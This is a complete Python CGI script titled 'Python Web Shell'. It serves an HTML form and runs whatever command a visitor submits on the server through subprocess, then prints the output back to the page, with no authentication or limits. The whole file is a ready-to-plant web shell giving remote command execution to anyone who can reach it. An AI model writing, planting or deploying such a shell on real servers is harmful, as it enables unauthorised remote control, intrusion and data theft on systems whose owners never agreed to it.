#!/usr/bin/python3

import cgi
import subprocess

import cgitb
cgitb.enable()

def run_command(command):
    if not command:
        raise ValueError("Empty command")
    
    try:
        result = subprocess.run(command.split(), capture_output=True, text=True, check=True)
        return result.stdout
    except subprocess.CalledProcessError as e:
        return f"Error: {e.stderr}"

def print_html_header():
    print("Content-Type: text/html")
    print()
    print("<html>")
    print("<head>")
    print("<title>Python Web Shell</title>")
    print("</head>")
    print("<body>")

def print_html_footer():
    print("</body>")
    print("</html>")

def print_command_output(command, output):
    print("<font face='monospace'>")
    print(f"$ {command}<br>")
    for line in output.split('\n'):
        print(f"{line}<br>")
    print("</font>")

def main():
    print_html_header()
    print("<form method='post' action='WebShell.py'>")
    print("<input type='text' name='command' />")
    print("<input type='submit' value='Submit' />")
    print("</form>")

    form = cgi.FieldStorage()
    if 'command' in form:
        command = form['command'].value
        output = run_command(command)
        print_command_output(command, output)

    print_html_footer()

if __name__ == "__main__":
    main()
